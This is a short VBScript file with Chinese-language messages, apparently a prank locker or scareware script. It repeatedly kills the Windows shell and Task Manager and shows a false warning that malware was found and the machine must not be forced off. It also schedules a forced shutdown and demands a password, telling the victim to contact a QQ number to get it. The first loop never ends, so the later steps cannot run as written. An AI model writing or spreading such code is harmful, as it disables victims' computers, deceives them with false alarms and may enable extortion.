
do
          CreateObject("WScript.Shell").Run "taskkill /f /im explorer.exe", 0
msgbox"系统检测有恶意程序，请勿强制关机以免损坏硬件",64
          set bag=getobject("winmgmts:\\.\root\cimv2")
           set pipe=bag.execquery("select * from win32_process where name='Taskmgr.exe'")
           for each i in pipe
           i.terminate()
           next
           wscript.sleep 1000
 loop



   dim W
   set W=wscript.createobject("wscript.shell") 
   W.run"shutdown -f -s -t 160",0


     dim a
     const pass="123456"
  do
    a=inputbox("联系QQ1596782257，获取密码，电脑将在10分钟后关闭")     
loop while a<>pass
msgbox"win+r输入shell:startup把密码.vbs文件删掉",64

   
